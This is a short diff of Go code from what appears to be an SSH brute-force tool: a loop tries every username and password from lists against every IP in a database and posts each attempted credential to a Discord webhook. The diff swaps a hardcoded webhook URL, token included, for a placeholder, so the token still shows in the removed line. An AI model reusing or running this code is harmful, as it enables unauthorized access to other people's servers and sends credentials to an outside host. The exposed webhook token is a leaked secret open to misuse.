@@ -66,7 +66,7 @@ func ConnectToServer(port int) {
 		for _, password := range passwords {
 			for _, ip := range allIpsInDB {
 				println("Connecting to", ip, "on port", port, "with username", username, "and password", password)
-				webhook := "https://discord.com/api/webhooks/1356857871215890452/TUSPalcrGvLv6urWFtTM4mbxHNR34wYeMPwu40nmZjxz3_elHiIlboGfvafO5Ng4OMMm"
+				webhook := "webhookHere"
 				cmd.SendWebhookMessage(webhook, fmt.Sprintf("Connecting to %s on port %d with username %s and password %s", ip, port, username, password))
 				err := SSHClient(ip, port, username, password)
 				if err != nil {
